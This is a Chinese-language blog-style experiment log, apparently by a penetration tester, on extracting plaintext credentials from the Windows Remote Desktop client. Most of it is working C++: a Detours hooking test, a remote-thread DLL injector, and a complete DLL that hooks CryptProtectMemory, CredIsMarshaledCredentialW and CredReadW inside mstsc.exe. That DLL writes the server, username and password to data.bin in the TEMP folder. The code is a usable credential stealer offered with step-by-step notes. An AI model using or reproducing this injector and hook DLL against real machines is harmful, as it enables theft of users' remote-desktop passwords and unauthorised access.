## 实验 ##
简单测试(HOOK了MessageBox)
```cpp
#include <Windows.h>
#include <detours.h> //加载detours库
#pragma comment (lib,"detours.lib")
static int(WINAPI *TrueMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT) = MessageBox; //根据函数原型来定义要被HOOk的函数（MSDN函数怎么写的你就怎么定义）
int WINAPI OurMessageBox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType) { //成功HOOK后的处理函数
	return TrueMessageBox(NULL, L"Hooked", lpCaption, 0); //HOOK成功弹个框
}
int main()
{
	DetourTransactionBegin(); //HOOK初始化
	DetourUpdateThread(GetCurrentThread()); //刷新本身线程
	DetourAttach(&(PVOID&)TrueMessageBox, OurMessageBox);  //加载要HOOK的函数
	DetourTransactionCommit(); //开始HOOK
	MessageBox(NULL, L"Hello", L"Hello", 0);
	DetourTransactionBegin(); //HOOK初始化
	DetourUpdateThread(GetCurrentThread()); //刷新本身线程
	DetourDetach(&(PVOID&)TrueMessageBox, OurMessageBox);  //取消HOOK
	DetourTransactionCommit(); //取消HOOK开始
}
```
如果HOOK成功的话，将如下图
![006LG7Nygy1g9xjwlnx5uj311r0hsjsp.jpg](http://ww1.sinaimg.cn/large/006LG7Nygy1g9xjwlnx5uj311r0hsjsp.jpg)

之后编译原作者写好的,之后注入到mstsc
常规的DLL注入
```cpp
#include "stdafx.h"
#include <Windows.h>

int main(int argc, char *argv[]) {
	HANDLE processHandle;
	PVOID remoteBuffer;
	wchar_t dllPath[] = TEXT("H:\\C master\\dll\\ConsoleApplication1\\x64\\Release\\ConsoleApplication1.dll");

	printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
	CloseHandle(processHandle);

	return 0;
}
```

如果成功注入的话，会出现如下图
![006LG7Nygy1g9xk11mc18j30pp0nl0x4.jpg](http://ww1.sinaimg.cn/large/006LG7Nygy1g9xk11mc18j30pp0nl0x4.jpg)

然后在temp目录下会有个data.bin，由于我是win7的原因API可能有些不同。记录不到IP
![006LG7Nygy1g9xk25waluj30ei06ymx5.jpg](http://ww1.sinaimg.cn/large/006LG7Nygy1g9xk25waluj30ei06ymx5.jpg)

之后看到了三好学生的博客里的操作，使用API Monitor附加了mstsc.exe找到了记录用户名的API 函数
![006LG7Nygy1g9xk5oly7qj31hc0qc10l.jpg](http://ww1.sinaimg.cn/large/006LG7Nygy1g9xk5oly7qj31hc0qc10l.jpg)

在根据MSDN文档里的CredReadW function定义方法，照搬定义即可
[CredReadW function (wincred.h) - Win32 apps \| Microsoft Docs](https://docs.microsoft.com/zh-cn/windows/win32/api/wincred/nf-wincred-credreadw?view=vs-2017)

修改之后
```cpp
// ConsoleApplication1.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include <Windows.h>
#include "detours.h"
#include <dpapi.h>
#include <wincred.h>
#include <strsafe.h>
#include <subauth.h>
#define SECURITY_WIN32 
#include <sspi.h>
#pragma comment(lib,"detours.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Secur32.lib")


LPCWSTR lpTempPassword = NULL;
LPCWSTR lpUsername = NULL;
LPCWSTR lpServer = NULL;

VOID WriteCredentials() {
	const DWORD cbBuffer = 1024;
	TCHAR TempFolder[MAX_PATH];
	GetEnvironmentVariable(L"TEMP", TempFolder, MAX_PATH);
	TCHAR Path[MAX_PATH];
	StringCbPrintf(Path, MAX_PATH, L"%s\\data.bin", TempFolder);
	HANDLE hFile = CreateFile(Path, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WCHAR  DataBuffer[cbBuffer];
	memset(DataBuffer, 0x00, cbBuffer);
	DWORD dwBytesWritten = 0;
	StringCbPrintf(DataBuffer, cbBuffer, L"Server: %s\nUsername: %s\nPassword: %s\n\n", lpServer, lpUsername, lpTempPassword);
	WriteFile(hFile, DataBuffer, wcslen(DataBuffer) * 2, &dwBytesWritten, NULL);
	CloseHandle(hFile);

}


static BOOL(WINAPI *OriginalCredReadW)(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential) = CredReadW;
BOOL HookedCredReadW(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential)
{
	lpServer = TargetName;
	return OriginalCredReadW(TargetName, Type, Flags, Credential);
}



static DPAPI_IMP BOOL(WINAPI * OriginalCryptProtectMemory)(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags) = CryptProtectMemory;

BOOL _CryptProtectMemory(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags) {

	DWORD cbPass = 0;
	LPVOID lpPassword;
	int *ptr = (int *)pDataIn;
	LPVOID lpPasswordAddress = ptr + 0x1;
	memcpy_s(&cbPass, 4, pDataIn, 4);


	//When the password is empty it only counts the NULL byte.
	if (cbPass > 0x2) {
		SIZE_T written = 0;
		lpPassword = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
		WriteProcessMemory(GetCurrentProcess(), lpPassword, lpPasswordAddress, cbPass, &written);
		lpTempPassword = (LPCWSTR)lpPassword;

	}

	return OriginalCryptProtectMemory(pDataIn, cbDataIn, dwFlags);
}


static BOOL(WINAPI * OriginalCredIsMarshaledCredentialW)(LPCWSTR MarshaledCredential) = CredIsMarshaledCredentialW;

BOOL _CredIsMarshaledCredentialW(LPCWSTR MarshaledCredential) {

	lpUsername = MarshaledCredential;
	if (wcslen(lpUsername) > 0) {

		WriteCredentials();
	}
	return OriginalCredIsMarshaledCredentialW(MarshaledCredential);
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved)
{
	if (DetourIsHelperProcess()) {
		return TRUE;
	}

	if (dwReason == DLL_PROCESS_ATTACH) {
		DetourRestoreAfterWith();
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourAttach(&(PVOID&)OriginalCryptProtectMemory, _CryptProtectMemory);
		DetourAttach(&(PVOID&)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
		DetourAttach(&(PVOID&)OriginalCredReadW, HookedCredReadW);

		DetourTransactionCommit();
	}
	else if (dwReason == DLL_PROCESS_DETACH) {
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourDetach(&(PVOID&)OriginalCryptProtectMemory, _CryptProtectMemory);
		DetourDetach(&(PVOID&)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
		DetourDetach(&(PVOID&)OriginalCredReadW, HookedCredReadW);
		DetourTransactionCommit();

	}
	return TRUE;
}
```
测试可以正常记录IP
![006LG7Nygy1g9xk925v8pj30dd067q2u.jpg](http://ww1.sinaimg.cn/large/006LG7Nygy1g9xk925v8pj30dd067q2u.jpg)

这里一开始自己定义CredReadW的时候踩了个坑...return没有返回定义的函数。返回了API原型的函数，结果记录的IP一直是乱码。坑了好久，直到搜到了三好学生的博客- -
（一开始写的）
![006LG7Nygy1g9xkcuvq7vj30la0daq3e.jpg](http://ww1.sinaimg.cn/large/006LG7Nygy1g9xkcuvq7vj30la0daq3e.jpg)

一定要返回定义的函数，不然问题多多....
这里应该返回CreadReadWs才对

## 参考链接 ##
[渗透技巧——从远程桌面客户端提取明文凭据 - 嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com](https://www.4hou.com/technology/21645.html)
[CredReadW function (wincred.h) - Win32 apps \| Microsoft Docs](https://docs.microsoft.com/zh-cn/windows/win32/api/wincred/nf-wincred-credreadw?view=vs-2017)